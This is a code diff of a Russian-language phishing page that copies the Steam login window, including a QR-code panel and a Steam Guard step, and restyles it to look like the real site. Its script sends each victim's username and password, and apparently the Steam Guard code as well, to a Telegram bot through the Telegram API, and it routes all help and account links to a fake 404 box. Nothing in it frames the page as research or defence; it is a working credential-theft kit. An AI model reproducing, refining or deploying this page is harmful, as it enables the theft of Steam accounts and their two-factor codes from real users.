@@ -6,139 +6,339 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Steam Вход</title>
+    <title>Steam Login</title>
     <style>
+        /* Стили точь-в-точь как в настоящем окне Steam (2026), включая твой дизайн с QR-кодом */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
             background: #1b2838;
-            color: #c6d4df;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            flex-direction: column;
+            color: #c6d4df;
         }
-        .login-box, .guard-box {
+        .login-container {
             width: 100%;
-            max-width: 380px;
+            max-width: 780px;
             background: #181e25;
             border-radius: 6px;
             padding: 32px 28px 24px;
             box-shadow: 0 4px 16px rgba(0,0,0,0.6);
             position: relative;
+            margin: 0 auto;
         }
-        /* Жирный белый текст STEAM — надёжнее некуда */
-        .logo {
-            text-align: center;
+        .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: transparent;
+            border: none;
+            color: #8a8a8a;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.2s;
+            z-index: 5;
+        }
+        .close-btn:hover { color: #c6d4df; }
+        .header {
+            display: flex;
+            align-items: center;
             margin-bottom: 28px;
-            font-size: 36px;
-            font-weight: bold;
-            color: #ffffff;
-            letter-spacing: 8px;
-            text-transform: uppercase;
-            font-family: "Arial Black", "Helvetica Neue", sans-serif;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
-        h2 { font-size: 20px; font-weight: 400; margin-bottom: 22px; text-align: center; color: #ffffff; letter-spacing: 0.3px; }
-        label { display: block; font-size: 13px; margin-bottom: 6px; color: #8a8a8a; text-transform: uppercase; letter-spacing: 0.4px; }
-        input {
-            width: 100%; padding: 12px; background: #32353b; border: 1px solid #434953;
-            border-radius: 3px; color: #dcdedf; font-size: 15px; margin-bottom: 18px; outline: none;
+        .back-arrow {
+            font-size: 28px;
+            color: #8a8a8a;
+            cursor: default;
+            margin-right: 24px;
+            user-select: none;
+        }
+        .logo img {
+            width: 176px;
+            height: 52px;
+            display: block;
+        }
+        .main-content {
+            display: flex;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+        .form-column {
+            flex: 1;
+            min-width: 280px;
+        }
+        .qr-column {
+            flex: 0 0 220px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .section-title {
+            font-size: 13px;
+            color: #8a8a8a;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            margin-bottom: 8px;
+            font-weight: normal;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #32353b;
+            border: 1px solid #434953;
+            border-radius: 3px;
+            color: #dcdedf;
+            font-size: 15px;
+            outline: none;
             transition: border-color 0.2s, background-color 0.2s;
         }
-        input:focus { border-color: #4c9b1c; background: #3a3e45; }
-        input::placeholder { color: #6a6f75; }
-        button {
-            width: 100%; padding: 14px; background: #5c7e10; border: none; border-radius: 3px;
-            color: #e5e4dc; font-size: 16px; font-weight: 600; letter-spacing: 0.5px; cursor: pointer;
-            margin-bottom: 18px; transition: background 0.2s;
+        .input-group input:focus {
+            border-color: #4c9b1c;
+            background: #3a3e45;
         }
-        button:hover { background: #6a9112; }
-        button:disabled { opacity: 0.6; cursor: not-allowed; }
-        .extra-links { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 10px; }
-        .extra-links a { color: #8a8a8a; text-decoration: none; }
-        .extra-links a:hover { color: #c6d4df; text-decoration: underline; }
+        .remember-me {
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #c6d4df;
+        }
+        .remember-me label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .remember-me input[type=checkbox] {
+            display: none;
+        }
+        .custom-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 1px solid #434953;
+            border-radius: 2px;
+            margin-right: 8px;
+            position: relative;
+            background: #32353b;
+        }
+        .remember-me input:checked + .custom-checkbox::after {
+            content: '';
+            position: absolute;
+            left: 4px;
+            top: 0px;
+            width: 6px;
+            height: 12px;
+            border: solid #5c7e10;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+        .submit-btn, .guard-submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #5c7e10;
+            border: none;
+            border-radius: 3px;
+            color: #e5e4dc;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            margin-bottom: 18px;
+            transition: background 0.2s;
+        }
+        .submit-btn:hover, .guard-submit-btn:hover { background: #6a9112; }
+        .submit-btn:disabled, .guard-submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .skip-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid #5a5a5a;
+            border-radius: 3px;
+            color: #9a9a9a;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            transition: border-color 0.2s, color 0.2s;
+        }
+        .skip-btn:hover { border-color: #8a8a8a; color: #c6d4df; }
+        .qr-wrapper {
+            background: white;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+        }
+        .qr-image {
+            width: 150px;
+            height: 150px;
+            display: block;
+        }
+        .qr-text {
+            font-size: 13px;
+            color: #8a8a8a;
+            text-align: center;
+            line-height: 1.4;
+        }
+        .qr-text a {
+            color: #8a8a8a;
+            text-decoration: none;
+        }
+        .qr-text a:hover { text-decoration: underline; }
         .footer {
-            margin-top: 24px; font-size: 11px; color: #4a4a4a; text-align: center;
-            max-width: 380px; line-height: 1.7;
+            margin-top: 24px;
+            border-top: 1px solid #2a2a2a;
+            padding-top: 16px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            font-size: 13px;
         }
-        .footer a { color: #4a4a4a; text-decoration: none; }
-        .footer a:hover { text-decoration: underline; }
+        .footer-link {
+            color: #8a8a8a;
+            text-decoration: none;
+        }
+        .footer-link:hover { text-decoration: underline; }
+        .footer-right {
+            display: flex;
+            gap: 6px;
+            color: #8a8a8a;
+        }
+        /* Спиннер загрузки */
         .loading-overlay {
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(24, 30, 37, 0.95); border-radius: 6px; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 10;
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(24, 30, 37, 0.95);
+            border-radius: 6px;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
         }
         .spinner {
-            width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2);
-            border-top: 3px solid #5c7e10; border-radius: 50%; animation: spin 0.8s linear infinite;
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #5c7e10;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
             margin-bottom: 12px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         .loading-text { color: #c6d4df; font-size: 14px; }
-        .guard-box { display: none; }
+        /* Форма Steam Guard (скрыта по умолчанию) */
+        .guard-form {
+            display: none;
+        }
+        /* Модальное окно 404 */
         .error-overlay {
-            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.75); justify-content: center; align-items: center; z-index: 100;
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.75);
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
         }
         .error-box {
-            background: #1b1b2e; padding: 28px; border-radius: 6px; text-align: center;
-            max-width: 320px; width: 90%;
+            background: #1b1b2e;
+            padding: 28px;
+            border-radius: 6px;
+            text-align: center;
+            max-width: 320px;
         }
         .error-box h3 { font-size: 22px; margin-bottom: 12px; color: #e74c3c; }
         .error-box p { font-size: 14px; color: #aaa; margin-bottom: 18px; }
-        .error-box button { background: #4a4a4a; color: white; padding: 10px 24px; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; }
-        .skip-btn {
-            width: 100%; padding: 12px; background: transparent; border: 1px solid #5a5a5a;
-            border-radius: 3px; color: #9a9a9a; font-size: 14px; cursor: pointer;
-            transition: border-color 0.2s, color 0.2s; margin-bottom: 10px;
+        .error-box button {
+            background: #4a4a4a; color: white; padding: 10px 24px;
+            border: none; border-radius: 3px; cursor: pointer;
         }
-        .skip-btn:hover { border-color: #8a8a8a; color: #c6d4df; }
     </style>
 </head>
 <body>
-    <div class="login-box" id="loginForm">
-        <div class="logo">S T E A M</div>
-        <h2>Войти в аккаунт</h2>
-        <label for="username">Имя аккаунта</label>
-        <input type="text" id="username" required autofocus>
-        <label for="password">Пароль</label>
-        <input type="password" id="password" required>
-        <button id="loginBtn" onclick="attemptLogin()">Войти</button>
-        <div class="extra-links">
-            <a href="#" onclick="show404(event)">Забыли пароль?</a>
-            <a href="#" onclick="show404(event)">Создать аккаунт</a>
+    <div class="login-container" id="loginContainer">
+        <!-- Кнопка закрытия (просто для вида, можно заблокировать) -->
+        <button class="close-btn" onclick="show404(event)">&times;</button>
+
+        <div class="header">
+            <div class="back-arrow">&#10094;</div>
+            <div class="logo">
+                <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam">
+            </div>
         </div>
+
+        <!-- Основной блок входа -->
+        <div id="loginBlock">
+            <div class="main-content">
+                <div class="form-column">
+                    <h2 class="section-title">ВОЙТИ, ИСПОЛЬЗУЯ ИМЯ АККАУНТА</h2>
+                    <div class="input-group">
+                        <input type="text" id="username" required autofocus placeholder="Имя аккаунта">
+                    </div>
+                    <h2 class="section-title">ПАРОЛЬ</h2>
+                    <div class="input-group">
+                        <input type="password" id="password" required placeholder="Пароль">
+                    </div>
+                    <div class="remember-me">
+                        <label>
+                            <input type="checkbox" checked>
+                            <span class="custom-checkbox"></span>
+                            Запомнить меня
+                        </label>
+                    </div>
+                    <button id="loginBtn" class="submit-btn" onclick="attemptLogin()">Войти</button>
+                </div>
+                <div class="qr-column">
+                    <h2 class="section-title">ИЛИ ПРИ ПОМОЩИ QR-КОДА</h2>
+                    <div class="qr-wrapper">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=SteamLoginMock" alt="QR Code" class="qr-image">
+                    </div>
+                    <p class="qr-text">
+                        Используйте <a href="#" onclick="show404(event)">мобильное приложение Steam</a>, чтобы войти с помощью QR-кода
+                    </p>
+                </div>
+            </div>
+            <div class="footer">
+                <a href="#" onclick="show404(event)" class="footer-link">Помогите, я не могу войти в аккаунт</a>
+                <div class="footer-right">
+                    <span class="footer-text">Нет аккаунта Steam?</span>
+                    <a href="#" onclick="show404(event)" class="footer-link">Создайте бесплатный аккаунт</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Форма Steam Guard (скрыта) -->
+        <div id="guardBlock" class="guard-form">
+            <div class="main-content">
+                <div class="form-column" style="max-width: 400px; margin: 0 auto;">
+                    <h2 style="font-size:20px; font-weight:400; text-align:center; margin-bottom:16px; color:#ffffff;">Steam Guard</h2>
+                    <p style="font-size:14px; color:#8a8a8a; text-align:center; margin-bottom:20px;">
+                        Введите код, сгенерированный в мобильном приложении Steam.
+                    </p>
+                    <div class="input-group">
+                        <input type="text" id="twofactorcode" required placeholder="Код">
+                    </div>
+                    <button class="guard-submit-btn" onclick="submitCode()">Подтвердить</button>
+                    <button class="skip-btn" onclick="skipCode()">У меня нет кода</button>
+                    <div style="text-align:center; margin-top:12px;">
+                        <a href="#" onclick="show404(event)" style="color:#8a8a8a; font-size:13px; text-decoration:none;">Помощь</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Спиннер загрузки -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="spinner"></div>
             <div class="loading-text">Проверка учётных данных…</div>
         </div>
     </div>
 
-    <div class="guard-box" id="guardForm">
-        <div class="logo">S T E A M</div>
-        <h2>Steam Guard</h2>
-        <p style="font-size:14px; color:#8a8a8a; text-align:center; margin-bottom:20px;">Введите код, сгенерированный в мобильном приложении Steam.</p>
-        <label for="twofactorcode">Код</label>
-        <input type="text" id="twofactorcode" required>
-        <button onclick="submitCode()">Подтвердить</button>
-        <button class="skip-btn" onclick="skipCode()">У меня нет кода</button>
-        <div class="extra-links">
-            <a href="#" onclick="show404(event)">Помощь</a>
-            <a href="#" onclick="show404(event)">Вернуться ко входу</a>
-        </div>
-    </div>
-
-    <div class="footer">
-        <span>© 2026 Valve Corporation. Все права защищены.</span><br>
-        <a href="#" onclick="show404(event)">Конфиденциальность</a> |
-        <a href="#" onclick="show404(event)">Правовая информация</a> |
-        <a href="#" onclick="show404(event)">Соглашение подписчика Steam</a> |
-        <a href="#" onclick="show404(event)">Возвраты</a>
-    </div>
-
+    <!-- Окно ошибки 404 -->
     <div class="error-overlay" id="errorOverlay">
         <div class="error-box">
             <h3>Ошибка 404</h3>
@@ -155,8 +355,8 @@
         function sendToTelegram(text) {
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: text})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
             });
         }
 
@@ -170,14 +370,16 @@
             }
             currentUsername = username;
             sendToTelegram(`🔥 НОВЫЙ ЛОГИН\nLogin: ${username}\nPassword: ${password}`);
+
+            // Показываем загрузку
             document.getElementById('loginBtn').disabled = true;
             document.getElementById('loadingOverlay').style.display = 'flex';
             setTimeout(() => {
-                document.getElementById('loginForm').style.display = 'none';
-                document.getElementById('guardForm').style.display = 'block';
+                document.getElementById('loginBlock').style.display = 'none';
+                document.getElementById('guardBlock').style.display = 'block';
                 document.getElementById('loadingOverlay').style.display = 'none';
                 document.getElementById('loginBtn').disabled = false;
-            }, 1200);
+            }, 1500);
         }
 
         function submitCode() {
@@ -204,6 +406,7 @@
             document.getElementById('errorOverlay').style.display = 'none';
         }
 
+        // Все ссылки с # перехватываем
         document.addEventListener('click', function(e) {
             if (e.target.tagName === 'A' && e.target.getAttribute('href') === '#') {
                 show404(e);
